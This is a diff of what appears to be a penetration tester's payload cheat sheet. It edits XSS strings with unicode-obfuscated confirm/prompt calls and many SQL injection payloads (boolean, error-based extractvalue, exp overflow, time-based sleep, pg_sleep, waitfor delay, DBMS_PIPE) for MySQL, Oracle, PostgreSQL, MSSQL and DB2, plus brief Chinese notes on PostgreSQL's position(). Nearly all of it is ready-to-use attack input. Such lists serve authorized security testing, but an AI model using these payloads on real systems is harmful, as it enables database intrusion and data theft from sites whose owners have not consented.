@@ -8,7 +8,6 @@
 <img src=1 onerror=co\u006efir\u006d`1`>
 "><img src=1 onerror=pr\u006fmpt(1)>
 %22-prompt(1)-%22
-
 ```
 
 ```yaml
@@ -16,15 +15,16 @@
 '''' 
 '||('0')||'
 '||'
-%'and substr('abc',1,1)='a' and'
-%'=' %'and substr('abc',1,1)='b' and'%'='
 %'and'%'='
 %'&&'%'='%
-%'and substr('abc',1,1)='a' and'%'='
-%'and substr('abc',1,1)='b' and'%'='
-'||exp(1)||'
-'||exp(710)||'
-1'and/**/extrAcTvalue(1,concat(0x7e,database(),0x7e))/**/and'
+%'and substr('abc',1,1)='a' and '%'='
+%'and substr('abc',1,1)='b' and '%'='
+'||(exp(709))||'
+'||(exp(710))||'
+case when 1=2 then 1 else 1/0 end
+case when 1=1 then 1 else 1/0 end
+(case%0a1%0awhen%0a1%0athen%0a1%0aelse%0a1%0aend)%0aSSSSasc
+
 
 oracle
 '||(decode(length(user),6,dbms_pipe.receive_message('o',1)))||'
@@ -32,34 +32,40 @@ oracle
 '||(case when 2=2 then exp(709) else exp(710) end)||'
 
 
+PostgreSQL
+position('sql' in 'postgresql')返回的是8
+position('sq' in 'postgresql')返回的也是8
+position('p' in 'postgresql')返回的则是1
 
 
-'||(decode(length(user),6,dbms_pipe.receive_message('o',1)))||' 
+(case SUBSTR(USER,1,1) when CHR(50) then exp(900) else PROVINCE_ID end) asc
+(case 1 when 1 then exp(900) else PROVINCE_ID end) asc
+1'and/**/extrAcTvalue(1,concat(0x7e,database(),0x7e))/**/and'
+'||(decode(length(user),6,dbms_pipe.receive_message('o',1)))||'
 '||(case when length(user)=2 then 1 else 3 end)||' 
 '||(case when 1 LIKE 1 then 1 else 3 end)||' 
 '||case when substr(user,2,1)-'A' then 1 else exp(9999) end||' 
-')AND (len(user)=5) AND ('1' LIKE '1 
-')AND (ascii((select substr(user,1,1) form dual))=66) 
-AND ('1' LIKE '1 
-B000'||decode((select count(*) from syscat.tables,syscat.columns)>0,1,'0',0,'01')||' 
-B000'||decode((select count(*) from syscat.tables,syscat.tables)>0,1,'0',0,'01')||'
+')AND+(len(user)=5)+AND+('1'+LIKE+'1 
+')AND+(ascii((select+substr(user,1,1)+form dual))=66)+AND+('1'+LIKE '1 
+B000'||decode((select+count(*)+from+syscat.tables,syscat.columns)>0,1,'0',0,'01')||' 
+B000'||decode((select+count(*)+from+syscat.tables,syscat.tables)>0,1,'0',0,'01')||'
 0'XOR(if(now()=sysdate(),sleep(3*2),0))XOR'Z 
 'and/**/extractvalue(1,concat(char(126),md5(1836161162)))and'
  "and/**/extractvalue(1,concat(char(126),md5(1836161162)))and" 
-/**/and/**/extractvalue(1,concat(char(126),md5(1836161162))) 
+/**/and/**/extractvalue(1,concat(char(126),md5(1836161162)))
 and sleep(5) 
 'and sleep(5) and '1 
 "and sleep(5) and "1 
-/**/and(select*from(select sleep(5)union/**/select 1)a) 
+/**/and(select*from(select+sleep(5)union/**/select+1)a) 
 'and(select*from(select/**/sleep(5)a/**/union/**/select 1)=' 
 "and(select*from(select/**/sleep(5)a/**/union/**/select 1)=" 
-/**/and(select/**/1/**/from/**/pg_sleep(5))>0/**/ 
+/**/and(select/**/1/**/from/**/pg_sleep(5))>0/**/
 '/**/and(select'1'from/**/pg_sleep(5))::text>'0 
 "/**/and(select\"1\"from/**/pg_sleep(5))::text>"0 
 /**/and(select/**/1)>0/**/waitfor/**/delay'0:0:5'/**/ 
 'and(select/**/1)>0/**/waitfor/**/delay'0:0:5
-"and(select/**/1)>0/**/waitfor/**/delay"0:0:5 
-/**/and/**/0=DBMS_PIPE.RECEIVE_MESSAGE('q',5) 
+"and(select/**/1)>0/**/waitfor/**/delay"0:0:5
+/**/and/**/0=DBMS_PIPE.RECEIVE_MESSAGE('q',5)
 '/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('q',5)='h 
 "/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE(\"q\",5)="h 
 '/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('t',3)='t" 
